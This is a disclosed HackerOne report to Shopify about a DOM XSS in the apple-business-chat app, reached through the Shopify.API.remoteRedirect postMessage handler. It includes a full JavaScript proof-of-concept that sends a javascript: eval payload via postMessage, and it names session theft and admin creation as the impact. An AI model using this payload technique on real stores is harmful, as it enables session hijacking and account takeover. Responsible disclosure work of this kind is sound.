# ██████ DOM XSS via Shopify.API.remoteRedirect

## Report Details
- **Report ID**: 646505
- **URL**: https://hackerone.com/reports/646505
- **State**: Closed
- **Severity**: low
- **Submitted**: 2019-07-17T04:07:20.510Z
- **Disclosed**: 2019-09-15T07:14:27.583Z

## Reporter
- **Username**: yxw21
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
Hi, team.
I found a dom xss on the apple-business-chat app that seems to be referring to a vulnerable js file.
For users who have installed this app, just let him use the theme code I provided to complete xss.
Modify the theme code to the following payload
```
<script>
	  function attack(){
	    let ctx=window.open('https://apple-business-chat-commerce.shopifycloud.com'),interval;
	    let payload=btoa(`window.opener.postMessage('success',location.origin);alert(document.domain)`);
	    interval=setInterval(()=>{
	        ctx && ctx.postMessage({
        		"message":"Shopify.API.remoteRedirect",
        		"data":{
        			"location":`javascript:eval(atob('${payload}'))`
        		}
	        },location.origin);
	    },500);
	    window.onmessage=(e)=>{
	    	e.data==="success"&&(
	    		console.log('attack success'),
	    		window.onmessage=null,
	    		clearInterval(interval)
	    	);
	    };
	  }
	  attack();
	</script>
	<a href="javascript:attack()" style="display:block;text-align:center;width:100%;height:300px;line-height:300px;background:#000;color:#fff;">click me start attack</a>
```
As shown below
{F531015}
Then click on the store front page to trigger
{F531016}

*█████*

## Impact

Steal session information, add administrators, etc.

## Attachments
- 2.png
- 1.png
